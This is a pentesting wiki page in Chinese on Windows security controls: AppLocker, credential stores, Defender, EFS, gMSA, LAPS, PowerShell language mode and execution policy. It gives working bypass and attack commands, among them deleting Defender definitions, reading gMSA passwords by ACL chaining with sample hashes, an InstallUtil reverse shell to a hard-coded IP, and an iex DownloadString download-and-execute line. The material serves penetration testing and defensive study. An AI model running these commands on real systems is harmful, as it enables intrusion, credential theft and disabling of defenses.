# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

应用程序白名单是一个已批准软件应用程序或可执行文件的列表，这些应用程序或文件允许存在并在系统上运行。其目标是保护环境免受有害 malware 以及不符合组织特定业务需求的未批准软件的影响。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**application whitelisting solution**，使系统管理员能够控制**用户可以运行哪些应用程序和文件**。它可以对可执行文件、脚本、Windows installer 文件、DLL、打包应用程序和打包应用程序安装程序实施**细粒度控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并限制对某些目录的写入权限，**但这些措施都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
此注册表路径包含 AppLocker 应用的配置和策略，可用于查看系统当前强制执行的规则集：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 用于绕过 AppLocker Policy 的实用 **Writable folders**：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 中执行任意内容，则可以使用其中的 **writable folders** 来 **bypass this**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 通常**受信任**的 [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可用于绕过 AppLocker。
- **编写不当的规则也可能被绕过**
- 例如，针对 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任意位置创建一个名为 **`allowed` 的文件夹**，这样就会被允许。
- 组织通常也会重点关注**阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但会忘记其他 [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- 由于会给系统带来额外负载，并且需要进行大量测试以确保不会导致任何功能损坏，**DLL enforcement 很少被启用**。因此，使用 **DLL 作为 backdoor 将有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任意进程中**执行 Powershell** 代码并绕过 AppLocker。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[4]](#references)</sup>

## 凭据存储

### Security Accounts Manager (SAM)

本地凭据存储在此文件中，密码以哈希形式保存。

### Local Security Authority (LSA) - LSASS

出于 Single Sign-On 的原因，**凭据**（哈希值）会**保存**在此子系统的**内存**中。\
**LSA** 管理本地**安全策略**（密码策略、用户权限等）、**身份验证**、**访问令牌**等。\
LSA 会负责检查 **SAM** 文件中提供的**凭据**（用于本地登录），并与**域控制器**通信以验证域用户身份。

**凭据**保存在 **LSASS 进程**中：Kerberos tickets、NT 和 LM hashes，以及可轻易解密的密码。

### LSA secrets

LSA 可以将一些凭据保存到磁盘中：

- Active Directory 计算机账户的密码（无法连接域控制器时）。
- Windows services 账户的密码
- scheduled tasks 的密码
- 更多内容（IIS applications 的密码等）

### NTDS.dit

它是 Active Directory 的数据库，仅存在于 Domain Controllers 中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10、Windows 11 以及部分 Windows Server 版本中提供的 Antivirus。它会**阻止**常见的 pentesting tools，例如 **`WinPEAS`**。不过，仍然存在**绕过这些保护的方法**。

### 检查

要检查 **Defender** 的**状态**，可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值以确定其是否处于 active 状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

你也可以运行以下命令来枚举它：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS 通过加密来保护文件，使用称为 **File Encryption Key (FEK)** 的**对称密钥**。该密钥使用用户的**公钥**加密，并存储在加密文件的 $EFS **备用数据流**中。需要解密时，会使用用户数字证书对应的**私钥**从 $EFS 流中解密 FEK。更多详情请参见 [here](https://en.wikipedia.org/wiki/Encrypting_File_System)。

**无需用户发起的解密场景**包括：

- 当文件或文件夹被移动到非 EFS 文件系统（例如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会自动解密。
- 通过 SMB/CIFS 协议在网络上发送的加密文件，会在传输前解密。

这种加密方式允许所有者**透明访问**加密文件。但是，仅更改所有者的密码并登录，并不能进行解密。

**要点**：

- EFS 使用对称 FEK，并通过用户的公钥对其加密。
- 解密时使用用户的私钥来访问 FEK。
- 在特定条件下会自动解密，例如复制到 FAT32 或通过网络传输。
- 所有者无需额外操作即可访问加密文件。

### 检查 EFS 信息

通过检查此路径是否存在，确认某个**用户**是否**使用过**此**服务**：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file>\ 检查**谁**可以**访问**该文件  
也可以在文件夹中使用 `cipher /e` 和 `cipher /d` 来**加密**和**解密**所有文件

### 解密 EFS 文件

#### Being Authority System

此方法要求**受害用户**在主机内**运行**一个**进程**。如果满足该条件，可以使用 `meterpreter` sessions 来冒充该用户进程的令牌（使用 `incognito` 中的 `impersonate_token`）。或者，也可以直接 `migrate` 到该用户的进程。

#### 知道用户密码


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft 开发了 **Group Managed Service Accounts (gMSA)**，用于简化 IT 基础设施中 service accounts 的管理。与通常启用 "**Password never expire**" 设置的传统 service accounts 不同，gMSA 提供了更安全且更易管理的解决方案：

- **自动密码管理**：gMSA 使用一个复杂的 240 字符密码，并根据域或计算机策略自动更改。此过程由 Microsoft 的 Key Distribution Service (KDC) 处理，因此无需手动更新密码。
- **增强安全性**：这些 accounts 不会被锁定，也不能用于交互式登录，从而提高了安全性。
- **支持多个主机**：gMSA 可以在多个主机之间共享，非常适合运行在多台服务器上的服务。
- **Scheduled Task 功能**：与 managed service accounts 不同，gMSA 支持运行 scheduled tasks。
- **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生变化时，系统会自动更新 Service Principal Name (SPN)，从而简化 SPN 管理。

gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由 Domain Controllers (DCs) 每 30 天自动重置。该密码是一个称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据 blob，只能由经过授权的 administrators 以及安装了 gMSA 的 servers 获取，从而确保环境安全。要访问此信息，需要使用 LDAPS 等 secured connection，或者连接必须通过 'Sealing & Secure' 进行 authenticated。

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)<sup>[[1]](#references)</sup>

你可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> 读取此密码。
```
/GMSAPasswordReader --AccountName jkohler
```
[**在此帖子中查看更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[1]](#references)</sup>

另外，请查看此[网页](https://cube0x0.github.io/Relaying-for-gMSA/)，了解如何执行 **NTLM relay attack** 来**读取** **gMSA** 的**密码**。<sup>[[1]](#references)</sup>

### 利用 ACL chaining 读取 gMSA managed password (GenericAll -> ReadGMSAPassword)

在许多环境中，低权限用户可以通过滥用配置错误的对象 ACL，在不 compromize DC 的情况下获取 gMSA secrets：<sup>[[3]](#references)</sup>

- 你可以控制的组（例如通过 GenericAll/GenericWrite）被授予对某个 gMSA 的 `ReadGMSAPassword` 权限。
- 将自己添加到该组后，你将继承通过 LDAP 读取 gMSA 的 `msDS-ManagedPassword` blob 并派生可用 NTLM credentials 的权限。

典型工作流程：

1) 使用 BloodHound 发现路径，并将你的 foothold principals 标记为 Owned。查找类似以下的 edges：
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 将自己添加到你控制的中间组（使用 bloodyAD 的示例）：
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) 通过 LDAP 读取 gMSA 管理的密码并推导 NTLM 哈希。NetExec 会自动提取 `msDS-ManagedPassword` 并将其转换为 NTLM：
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) 使用 NTLM hash 以 gMSA 身份进行身份验证（无需明文凭据）。如果该账户属于 Remote Management Users，WinRM 将直接工作：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- LDAP 读取 `msDS-ManagedPassword` 需要 sealing（例如 LDAPS/sign+seal）。Tools 会自动处理。
- gMSA 通常会被授予 WinRM 等本地权限；请验证组成员身份（例如 Remote Management Users），以便规划 lateral movement。
- 如果只需要该 blob 来自行计算 NTLM，请参阅 MSDS-MANAGEDPASSWORD_BLOB structure。



## LAPS

**Local Administrator Password Solution (LAPS)** 可从 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) 下载，用于管理本地 Administrator 密码。这些密码经过**随机化**、彼此唯一且**定期更改**，并集中存储在 Active Directory 中。通过 ACL 将这些密码的访问权限限制为 authorized users。获得足够权限后，即可读取本地 admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) 会**锁定许多有效使用 PowerShell 所需的功能**，例如阻止 COM objects、仅允许 approved .NET types、基于 XAML 的 workflows、PowerShell classes 等。

### **检查**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 绕过
```bash
#Easy bypass
Powershell -version 2
```
在当前版本的 Windows 中，该 Bypass 无法使用，但你可以使用 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，你可能需要** **依次** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`，并将项目**更改为 .Net4.5**。

#### 直接 bypass：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任意进程中 **execute Powershell** 代码，并绕过 constrained mode。更多信息请参阅：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[4]](#references)</sup>

## PS Execution Policy

默认情况下，它被设置为 **restricted**。绕过此策略的主要方法：
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
更多内容请参见[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

这是一个可用于对用户进行身份验证的 API。

SSPI 负责为希望进行通信的两台机器寻找合适的协议。首选方法是 Kerberos。随后，SSPI 会协商要使用的身份验证协议。这些身份验证协议称为 Security Support Provider (SSP)，以 DLL 的形式存放在每台 Windows 机器中，并且两台机器必须支持相同的 SSP 才能进行通信。

### Main SSPs

- **Kerberos**：首选协议
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 和 **NTLMv2**：出于兼容性原因使用
- %windir%\Windows\System32\msv1_0.dll
- **Digest**：用于 Web 服务器和 LDAP，密码以 MD5 hash 的形式存在
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**：用于 SSL 和 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**：用于协商要使用的协议（Kerberos 或 NTLM，其中 Kerberos 为默认协议）
- %windir%\Windows\System32\lsasrv.dll

#### 协商过程可能会提供多种方法，也可能只提供一种方法。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项可为**提升权限的活动显示同意提示**的功能。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
